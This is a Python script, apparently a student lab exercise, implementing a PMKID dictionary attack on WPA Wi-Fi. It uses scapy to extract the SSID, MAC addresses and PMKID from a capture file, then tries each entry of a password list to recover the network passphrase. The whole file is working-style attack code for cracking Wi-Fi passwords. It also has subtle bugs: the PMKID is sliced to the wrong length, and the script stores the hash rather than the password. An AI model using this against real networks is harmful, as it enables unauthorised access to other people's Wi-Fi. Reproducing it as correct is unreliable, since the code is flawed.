#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Implementation of PMKID attack
"""
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp
from scapy.layers.eap import EAPOL

__author__ = "Sauge Ryan, Le Ray Quentin"
__license__ = "GPL"
__version__ = "1.0"

from scapy.all import *

from binascii import a2b_hex, b2a_hex
# from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib



# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid = ""
APmac = ""
Clientmac = ""
ANonce = ""
cpt = 0
mic_to_test = ""
SNonce = ""
noframe = 1
for pkt in wpa:
    if noframe == 33:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            if pkt.type == 0 and pkt.subtype == 8:
                ssid = pkt.info
                print("SSID", ssid)
                APmac = a2b_hex(pkt.addr2.replace(":", ""))
                print("APmAc", APmac)
    if pkt.haslayer(EAPOL) and noframe == 146:
        print(pkt.summary())
        ANonce = pkt[EAPOL].load[13:13 + 0x20]
        print("ANonce", pkt[EAPOL].load[13:13 + 0x20].hex())
        PMKID = pkt[Raw].load[101:234]
        print("PMKID", PMKID.hex())
        Clientmac = a2b_hex(pkt.addr1.replace(":", ""))
        print("Clientmac", Clientmac)

    noframe = noframe + 1
_pass_list = []
lastPass = ""
lines = []
file_path = "./PasswordDictionary.txt"
doc_len = len(open(file_path, "r", errors='replace').readlines())
# https://github.com/teemal/rock_py/blob/master/dict_attack.py
with open(file_path, "r", errors='replace') as f:
    for _ in range(doc_len):
        lines.append(f.readline())
for _pass in lines:
    _pass = _pass.rstrip('\n')
    _pass = str.encode(_pass)
    _pmk = pbkdf2(hashlib.sha1, _pass, ssid, 4096, 32)
    _ap = APmac
    _cl = Clientmac
    _pmk_fs = b"PMK Name"
    PMKID_Compute = hmac.new(_pmk, _pmk_fs + _ap + _cl, hashlib.sha1).hexdigest()[:32]
    if b2a_hex(PMKID) == bytes(PMKID_Compute, "utf-8"):
        lastPass = PMKID_Compute
        break
print("passphrase found", lastPass)